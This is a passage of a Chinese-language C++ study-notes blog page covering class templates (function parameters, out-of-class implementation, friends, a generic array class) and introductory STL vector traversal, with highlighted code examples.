&amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    p.<span class="built_in">showperson</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test05</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Person3&lt;string,<span class="type">int</span>&gt;  <span class="title">p</span><span class="params">(<span class="string">&quot;curry&quot;</span>,<span class="number">29</span>)</span></span>;</span><br><span class="line">    <span class="built_in">print1</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2.参数模板化      –将对象中的参数变为模板进行传递</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T1</span>,<span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person3</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    T1 name;</span><br><span class="line">    T2 age;</span><br><span class="line">    <span class="built_in">Person3</span>(T1 name,T2 age)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name=name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">showperson</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="keyword">this</span>-&gt;name&lt;&lt;<span class="keyword">this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T1,<span class="keyword">class</span> T2&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print1</span><span class="params">(Person3&lt;T1,T2&gt; &amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    p.<span class="built_in">showperson</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test05</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Person3&lt;string,<span class="type">int</span>&gt;  <span class="title">p</span><span class="params">(<span class="string">&quot;curry&quot;</span>,<span class="number">29</span>)</span></span>;</span><br><span class="line">    <span class="built_in">print1</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.整个类模板化   –将这个对象类型 模板化进行传递</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T1</span>,<span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person3</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    T1 name;</span><br><span class="line">    T2 age;</span><br><span class="line">    <span class="built_in">Person3</span>(T1 name,T2 age)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name=name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">showperson</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="keyword">this</span>-&gt;name&lt;&lt;<span class="keyword">this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>&gt;   <span class="comment">//整个类模板化</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print1</span><span class="params">(T1 &amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    p.<span class="built_in">showperson</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test05</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Person3&lt;string,<span class="type">int</span>&gt;  <span class="title">p</span><span class="params">(<span class="string">&quot;curry&quot;</span>,<span class="number">29</span>)</span></span>;</span><br><span class="line">    <span class="built_in">print1</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>类模板与继承</strong><br><strong>如果父类是类模板，子类需要指定出父类中T的数据类型</strong><br><strong>​</strong><br><strong>​</strong><br><strong>类模板成员函数的类外实现</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>,<span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person4</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">     T1 name;</span><br><span class="line">     T2 age;</span><br><span class="line">     <span class="built_in">Person4</span>(T1 name,T2 age);</span><br><span class="line">     <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数的类外实现</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>,<span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line">Person4&lt;T1,T2&gt;::<span class="built_in">Person4</span>(T1 name,T2 age)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;age=age;</span><br><span class="line">    <span class="keyword">this</span>-&gt;name=name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>,<span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="type">void</span> Person4&lt;T1,T2&gt;::<span class="built_in">show</span>()</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>类模板分文件编写</strong><br><strong>question：类模板中成员函数创建时机实在调用阶段，导致分文件编写时链接不到。</strong><br><strong>​</strong><br><strong>解决方式1：直接包含.cpp文件</strong><br><strong>解决方式2：将声明和实现写在同一个文件中，并更改后缀名.hpp（.hpp是约定的名称，并不是强制要求）</strong><br><strong>​</strong><br><strong>即使在.h中声明相关数据结构，在.cpp文件中实现，但是在c++中类模板实在调用时在创建的，在主函数文件中包含.h头文件，编译器并不会创建相关的成员函数，因此在执行中会产生错误</strong><br><strong>​</strong><br><strong>​</strong><br><strong>类模板与友元</strong><br><strong>全局函数类内实现 -直接在类内声明友元即可</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person5</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">friend</span>  <span class="type">void</span> <span class="title">showperson5</span><span class="params">(Person5&lt;T&gt; p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;p.age;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person5</span>(T age)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T age;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test06</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Person5&lt;<span class="type">int</span>&gt; <span class="title">p</span><span class="params">(<span class="number">19</span>)</span></span>;</span><br><span class="line">    <span class="built_in">showperson5</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>全局函数类外实现-需要提前让编译器知道全局函数的 存在</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;   <span class="comment">//告诉编译器有这个模板类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;     <span class="comment">//全局函数的类外实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showperson5</span><span class="params">(Person5&lt;T&gt; p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;p.age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person5</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">friend</span>  <span class="type">void</span> showperson5&lt;&gt;(Person5&lt;T&gt; p);</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person5</span>(T age)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T age;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test06</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Person5&lt;<span class="type">int</span>&gt; <span class="title">p</span><span class="params">(<span class="number">19</span>)</span></span>;</span><br><span class="line">    <span class="built_in">showperson5</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>类模板实例-数组类封装</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">template&lt;class T&gt;</span><br><span class="line">class Myarray</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    T* address;</span><br><span class="line">    int capacity;</span><br><span class="line">    int size;</span><br><span class="line">public:</span><br><span class="line">    Myarray(int capacity)</span><br><span class="line">    &#123; //  cout&lt;&lt;&quot;有参构造&quot;;</span><br><span class="line">        this-&gt;capacity = capacity;</span><br><span class="line">        this-&gt;size=0;</span><br><span class="line">        this-&gt;address = new T[this-&gt;capacity];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //尾插法向数组中添加数据</span><br><span class="line">    void Push_Back(const T &amp;value)</span><br><span class="line">    &#123;</span><br><span class="line">        if(this-&gt;capacity==this-&gt;size)</span><br><span class="line">        &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125; else</span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;address[this-&gt;size]=value;</span><br><span class="line">            this-&gt;size++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //通过下标方式访问数组</span><br><span class="line">    T&amp; operator[](int index)</span><br><span class="line">    &#123;</span><br><span class="line">        return this-&gt;address[index];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //尾删法删除数据</span><br><span class="line">    void Pop_Back()</span><br><span class="line">    &#123;</span><br><span class="line">        if(this-&gt;size==0)</span><br><span class="line">        &#123;</span><br><span class="line">            return ;</span><br><span class="line">        &#125;else</span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;size--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Myarray(const Myarray&amp; arr)</span><br><span class="line">    &#123;</span><br><span class="line">      //     cout&lt;&lt;&quot;拷贝构造&quot;;</span><br><span class="line">            this-&gt;capacity = arr.capacity;</span><br><span class="line">            this-&gt;size = arr.size;</span><br><span class="line">            this-&gt;address = new T[this-&gt;capacity];</span><br><span class="line"></span><br><span class="line">            for(int i=0;i&lt;this-&gt;size;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                this-&gt;address[i] = arr.address[i];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //重载=防止浅拷贝</span><br><span class="line">    Myarray&amp;  operator=(const Myarray&amp; arr)</span><br><span class="line">     &#123;</span><br><span class="line">        if (this-&gt;address != NULL)</span><br><span class="line">        &#123;  // cout&lt;&lt;&quot;重载=&quot;;</span><br><span class="line">            delete[] address;</span><br><span class="line">            address = NULL;</span><br><span class="line">            this-&gt;capacity = 0;</span><br><span class="line">            this-&gt;capacity = arr.capacity;</span><br><span class="line">            this-&gt;size = arr.size;</span><br><span class="line">            this-&gt;address = new T[this-&gt;capacity];</span><br><span class="line"></span><br><span class="line">            for(int i=0;i&lt;this-&gt;size;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                this-&gt;address[i] = arr.address[i];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return *this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ~Myarray()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        if(this-&gt;address!=NULL)</span><br><span class="line">        &#123;</span><br><span class="line">          //  cout&lt;&lt;&quot;析构函数&quot;;</span><br><span class="line">            delete [](address);</span><br><span class="line">            this-&gt;address=NULL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>在进行数组添加自定义类型数组时需要注意：在自定义类型的类中不可忽略了无参构造</strong><br><strong>​</strong><br>c++STL(string 与 vector)<strong>STL(标准模板库)：****减轻工作量，增强代码的复用性</strong><br><strong>STL从广义上分为：容器，算法，迭代器****​</strong><br><strong>容器和算法之间通过迭代器进行无缝衔接</strong><br><strong>STL几乎所有的代码都采用了模板库或者模板函数</strong><br><strong>​</strong><br><strong>STL大体分为6大组件：****容器，算法，迭代器，仿函数，适配器，空间配置器</strong><br><strong>​</strong><br><strong>1.容器：各种数据结构，如vector,list,deque,set,map等，用来存储数据</strong><br><strong>2.算法：各种常用的算法，如sort，find，copy，for_each等</strong><br><strong>3.迭代器：扮演了容器与算法之间的胶合剂</strong><br><strong>4.仿函数：行为类似函数，可作为算法的某种策略</strong><br><strong>5.适配器：一种用来修饰容器或者仿函数或迭代器接口的东西</strong><br><strong>6.空间配置器：负责空间的配置与管理</strong><br><strong>​</strong><br><strong>​</strong><br><strong>VECTOR</strong><br><strong>vector容器对内置数据类型进行遍历</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">printdata</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;val&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; p;</span><br><span class="line">    p.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">    p.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">    p.<span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">    p.<span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line">    p.<span class="built_in">push_back</span>(<span class="number">60</span>);</span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator  it = p.<span class="built_in">begin</span>();</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator  ie = p.<span class="built_in">end</span>();</span><br><span class="line">    <span class="keyword">while</span>(it!=ie)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;*it;</span><br><span class="line">            it++;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//算法配合容器来遍历</span></span><br><span class="line">    for_each(p.<span class="built_in">begin</span>(),p.<span class="built_in">end</span>(),printdata);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//for循环遍历</span></span><br><span class="line">    <span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;::iterator it=p.<span class="built_in">begin</span>();it!=p.<span class="built_in">end</span>();it++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;*it;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>vector对自定义类型数据进行遍历</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">printperson</span><span class="params">(person &amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;p.<span class="built_in">getname</span>()&lt;&lt;p.<span class="built_in">getage</span>()&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;person&gt; p;</span><br><span class="line">    <span class="function">person <span class="title">p1</span><span class="params">(<span class="string">&quot;curry&quot;</span>,<span class="number">10</span>)</span></span>;</span><br><span class="line">    <span class="function">person <span class="title">p2</span><span class="params">(<span class="string">&quot;james&quot;</span>,<span class="number">20</span>)</span></span>;</span><br><span class="line">    p.<span class="built_in">push_back</span>(p1);</span><br><span class="line">    p.<span class="built_in">push_back</span>(p2);</span><br><span class="line"></span><br><span class="line">    vector&lt;person&gt;::iterator it = p.<span class="built_in">begin</span>();</span><br><span class="line">    vector&lt;person&gt;::iterator ie = p.<span class="built_in">end</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第一种遍历方式</span></span><br><span class="line">    <span class="keyword">while</span>(it!=ie)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;it-&gt;<span class="built_in">getname</span>()&lt;&lt;it-&gt;<span class="built_in">getage</span>()&lt;&lt;endl;</span><br><span class="line">        it++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第二种遍历方式</span></span><br><span class="line">    <span class="keyword">for</span>(vector&lt;person&gt;::iterator it = p.<span class="built_in">begin</span>();it!=p.<span class="built_in">end</span>();it++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;it-&gt;<span class="built_in">getname</span>()&lt;&lt;it-&gt;<span class="built_in">getage</span>()&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第三种遍历方式</span></span><br><span class="line">    for_each(p.<span class="built_in">begin</span>(),p.<span class="built_in">end</span>(),printperson);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>vector容器中嵌套容器（相当于二维数组）</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">printvector</span><span class="params">( vector&lt;<span class="type">int</span>&gt; &amp;v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>();it!=v.<span class="built_in">end</span>();it++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;*it;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; vt;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v2;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v3;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v4;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1.<span class="built_in">push_back</span>(i);</span><br><span class="line">        v2.<span class="built_in">push_back</span>(i+<span class="number">1</span>);</span><br><span class="line">        v3.<span class="built_in">push_back</span>(i+<span class="number">2</span>);</span><br><span class="line">        v4.<span class="built_in">push_back</span>(i+<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vt.<span class="built_in">push_back</span>(v1);</span><br><span class="line">    vt.<span class="built_in">push_back</span>(v2);</span><br><span class="line">    vt.<span class="built_in">push_back</span>(v3);</span><br><span class="line">    vt.<span class="built_in">push_back</span>(v4);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;::iterator  it = vt.<span class="built_in">begin</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;::iterator  ie = vt.<span class="built_in">end</span>();</span><br><span class="line">    <span class="comment">//第一种遍历方式</span></span><br><span class="line">    <span class="keyword">while</span>(it!=ie)   <span class="comment">//第一层while循环用于四个小容器循环，第二个while循环用于每个小容器内部的遍历</span></span><br><span class="line">    &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;::iterator ib = (*it).<span class="built_in">begin</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;::iterator ien = (*it).<span class="built_in">end</span>();</span><br><span class="line">        <span class="keyword">while</span>(ib!=ien)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;*ib;</span><br><span class="line">            ib++;</span><br><span class="line">        &#125;</span><br><span class="line">   